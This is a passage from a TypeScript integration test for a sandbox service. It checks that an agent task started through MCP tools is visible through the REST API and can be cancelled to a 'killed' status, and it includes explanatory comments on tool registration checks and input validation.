   * half delegates to the identical application service rather than to a parallel
   * implementation.
   *
   * The `@Tool` NAME registration is machine-checked elsewhere and better: `docs:check`
   * B2 scans the source for `@Tool({name})` and requires the set to equal doc 02 §5.2's
   * ✅ rows exactly — a stronger guarantee than any assertion in this file, because it
   * also catches a tool that was registered but never documented.
   *
   * INPUT VALIDATION is not asserted here for an honest reason: the MCP transport
   * validates a tool's declared `parameters` before the method is reached, so calling
   * the method directly SKIPS it. Both shells declare the same `RunAgentTaskSchema`, and
   * the whitelist is exercised for real on the REST leg above.
   */
  it('run_agent_task starts a run the REST side can see, and cancel_agent_task stops it', async () => {
    const sandboxId = await runningSandbox();
    const tools = app.get(SandboxMcpTools);

    const started = await tools.runAgentTask({
      sandboxId,
      runtime: RUNTIME,
      prompt: 'from MCP',
      timeoutMinutes: 240,
    });
    const dto = JSON.parse(started.content[0].text) as AgentTaskDto;
    expect(dto.status).toBe('running');
    // the same run, through the other shell.
    const overRest = await http().get(`/api/sandboxes/${sandboxId}/tasks/${dto.id}`).expect(200);
    expect(overRest.body.id).toBe(dto.id);

    const plane = registryProviders.aio.jobs!;
    const before = plane.released.length;
    const cancelled = await tools.cancelAgentTask({ sandboxId, taskId: dto.id });
    expect(JSON.parse(cancelled.content[0].text).id).toBe(dto.id);
    await waitFor(() => plane.released.length > before, 'the cancelled MCP run to finalise');
    const final = await http().get(`/api/sandboxes/${sandboxId}/tasks/${dto.id}`).expect(200);
    expect(final.body.status).toBe('killed');
  });
});
